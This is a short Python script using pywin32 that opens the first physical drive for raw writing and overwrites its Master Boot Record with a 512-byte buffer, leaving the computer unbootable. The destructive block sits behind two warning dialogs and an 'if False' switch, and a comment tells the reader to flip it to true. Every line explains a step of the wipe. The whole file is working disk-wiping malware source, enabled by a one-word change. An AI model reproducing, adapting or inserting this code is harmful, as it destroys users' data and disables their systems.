# Needs to have library "pywin32" installed!
from win32file import *
from win32api import *
from win32gui import *
from win32ui import *
from win32con import *

def main():
    # Warnings will be neccessary
    if MessageBox("Warning! This program will overwrite your Master Boot Record! Making your computer unusable. Do you want to continue?", "WARNING!", MB_YESNO | MB_ICONWARNING) == 7:
        return
    if MessageBox("Last warning! If you understand the risks and consequenses of doing this, press yes.", "WARNING!", MB_YESNO | MB_ICONWARNING) == 7:
        return
    if False: # change this to true
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", # Path to physical drive
                                GENERIC_WRITE, # Say that we wanna write to the file
                                FILE_SHARE_READ | FILE_SHARE_WRITE, # We're going to read and write to the file
                                None, # Nothing as PySecurity
                                OPEN_EXISTING, # Open the one that exists
                                0, 0) # Creates a handle
        WriteFile(hDevice, AllocateReadBuffer(512), None) # Write buffering to handle, AKA overwrite MBR!
        CloseHandle(hDevice) # Close our handle, kinda a memory thing.

main()